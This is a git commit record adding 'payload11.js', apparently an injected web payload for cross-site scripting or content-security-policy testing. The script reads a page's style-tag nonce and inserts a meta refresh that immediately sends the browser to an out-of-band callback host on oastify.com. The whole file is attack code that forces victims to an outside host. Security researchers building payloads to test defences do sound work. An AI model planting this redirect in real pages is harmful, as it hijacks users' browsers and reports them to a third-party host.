e7e7b1dec5304bf548c03715c3cd5dbf7d2aab28
Mazin Ahmed <mazen160@users.noreply.github.com>
2025-06-25 11:39:08 -0700

    Create payload11.js

---
+++ payload11.js
@@ -0,0 +1,11 @@
+// Get the nonce from the style tag
+const nonce = document.getElementsByTagName('style')[0].nonce;
+
+
+// Create meta refresh element
+var meta = document.createElement('meta');
+meta.setAttribute('http-equiv', 'refresh');
+meta.setAttribute('content', '0; url=https://f7njyvj7vg0zel7kvfhsacudo4uvim9ay.oastify.com/z1');
+
+// Append to document head
+document.head.appendChild(meta);
